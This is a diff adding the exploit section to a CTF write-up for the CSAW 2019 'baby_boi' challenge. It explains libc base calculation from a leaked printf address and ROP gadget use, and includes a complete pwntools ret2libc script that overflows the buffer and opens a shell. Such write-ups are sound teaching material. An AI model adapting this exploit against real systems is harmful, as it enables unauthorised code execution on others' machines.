@@ -55,3 +55,73 @@ Now I will explain why we need these:
 * pop rdi gadget: To point the argument of **system** function to /bin/sh
 * ret gadget: Exit gadget
 
+Now, how to find all of these? Here's what you can do:
+* libc base address: Remember that we have a free address from the program which is *printf*, this address belongs to the binary. So in order to calculate the base address, we need the offset of *printf* in the libc and substract the binary's *printf* address with the offset from libc.
+* system offset: After we get the libc base, we can calculate the system offset by adding the offset with the libc base.
+* /bin/sh offset: Calculate the /bin/sh string offset by adding the libc base with the offset.
+* pop rdi gadget and ret gadget: Use ROPgadget
+
+After we get all the requirements, now we can develop our exploit code.
+
+```python
+from pwn import *
+
+# Get the gadget addresses from ROPgadget
+pop_rdi = 0x400793
+ret = 0x40054e
+
+'''ret2libc attack pattern:
+- buffer
+- overwrite rbp
+- pop rdi; ret
+- address of /bin/sh
+- ret gadget
+- address of system
+in 64-bit program, the call of a function is as following:
+- a place for function's argument
+- argument
+- exit
+- the function address
+'''
+
+def exploit():
+	r.recvline()
+	# Get printf address in binary
+	printf_memory_addr = int(r.recvuntil("\n").split(' ')[3], 16)
+	log.info('printf addr in memory: {}'.format(hex(printf_memory_addr)))
+	log.info('printf addr in libc: {}'.format(hex(libc.symbols['printf'])))
+	# Calculate libc base address
+	libc_base = printf_memory_addr - libc.symbols['printf']
+	log.info('libc base: {}'.format(hex(libc_base)))
+	# Calculate system offset
+	system_addr = libc_base + libc.symbols['system']
+	log.info('system addr: {}'.format(hex(system_addr)))
+	log.info('pop rdi; ret; addr: {}'.format(hex(pop_rdi)))
+	# Calculate /bin/sh offset
+	bin_sh = libc_base + libc.search('/bin/sh').next()
+	log.info('/bin/sh addr: {}'.format(hex(bin_sh)))
+	# Fill the buffer
+	payload = "a" * 32
+	# More padding
+	payload += "b" * 8
+	# Prepare the place for system's argument
+	payload += p64(pop_rdi)
+	# System's argument
+	payload += p64(bin_sh)
+	# Return gadget
+	payload += p64(ret)
+	# Call the system
+	payload += p64(system_addr)
+	# Send the payload
+	r.sendline(payload)
+	# Prompt interactive mode since we have the shell now
+	r.interactive()
+
+elf = ELF("./baby_boi", checksec = False)
+libc = ELF('./libc-2.27.so', checksec = False)
+r = process(elf.path)
+#r = remote("pwn.chal.csaw.io", 1005)
+
+exploit()
+```
+<p align="center"><img src="https://blog.xarkangels.com/ctf/assets/csaw2019_baby_boi/flag.png"></p>
